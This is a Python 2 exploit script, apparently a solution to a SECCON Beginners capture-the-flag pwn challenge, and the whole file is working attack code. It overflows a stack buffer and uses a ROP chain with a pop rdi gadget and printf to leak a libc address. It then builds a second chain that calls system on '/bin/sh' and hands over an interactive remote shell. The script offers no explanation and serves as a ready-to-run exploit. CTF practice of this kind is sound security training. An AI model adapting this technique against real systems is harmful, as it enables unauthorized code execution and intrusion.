import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a):
    return struct.pack("<Q",a)

def u(a):
    return struct.unpack("<Q",a)[0]

def main():
    system = 0x0000000000400540
    printf = 0x0000000000400550
    libc_start_main = 0x000000601038
    poprdi = 0x00400763
    buf = "A"*136
    buf += p(poprdi)
    buf += p(libc_start_main)
    buf += p(printf)
    buf += p(0x00000000004006a1) # main
    f.write(buf+"\n")

    # leak libc
    read_until(f,"=\n")
    read_until(f,"=\n")
    libc = u(f.read(6)+"\x00"*2) - libc_start_offset
    print "libc: ",hex(libc)
    binsh = libc + binsh_offset
    print "binsh: ",hex(binsh)

    buf = "A"*136
    buf += p(poprdi)
    buf += p(binsh)
    buf += p(system)
    f.write(buf+"\n")
    shell(s)

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("pwn1.chall.beginners.seccon.jp", 18373)
        libc_start_offset = 0x0000000000020740
        binsh_offset = 0x18cd57
        main()
    else:
        s, f = sock("localhost", 18373)
        libc_start_offset = 0x0000000000020740
        binsh_offset = 0x18cd57
        main()
